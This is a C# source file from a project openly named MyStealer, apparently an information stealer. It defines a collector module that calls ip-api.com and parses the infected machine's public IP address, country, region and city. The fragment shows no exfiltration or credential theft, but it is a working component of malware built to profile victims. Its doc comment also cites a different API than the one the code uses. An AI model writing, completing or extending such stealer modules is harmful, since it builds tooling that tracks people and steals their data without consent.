using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace MyStealer.Collectors.Ip
{
    /// <summary>
    /// https://ip.pe.kr/api/
    /// </summary>
    public class IpApiComProvider : ApiProviderBase
    {
        public override string ModuleName => "ip-api.com";

        public override Uri ApiUrl => new Uri("http://ip-api.com/json/");

        public override IpDetails Parse(string response)
        {
            try
            {
                var obj = JObject.Parse(response);

                return new IpDetails
                {
                    Address = IPAddress.Parse(obj["query"].Value<string>()),
                    CountryCode = obj["countryCode"].Value<string>(),
                    RegionName = obj["regionName"].Value<string>(),
                    City = obj["city"].Value<string>()
                };
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing api response.");
                return IpDetails.Empty;
            }
        }
    }
}
